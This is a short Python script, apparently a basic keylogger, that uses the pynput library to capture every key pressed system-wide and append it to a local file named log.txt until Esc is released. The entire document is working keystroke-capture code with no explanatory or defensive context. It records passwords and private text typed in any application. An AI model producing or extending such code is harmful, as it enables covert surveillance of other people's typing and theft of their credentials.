import pynput
from pynput.keyboard import Key, Listener
count=0
keysL=[]

def on_press(key):
	global keysL,count
	keysL.append(key)
	count+=1
	if count>=1:
		count=0
		write_file(keysL)
		keysL=[]


def write_file(keysL):
	with open("log.txt","a") as f:
		for key in keysL:
			f.write(str(key))


def on_release(key):
	if key == Key.esc:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()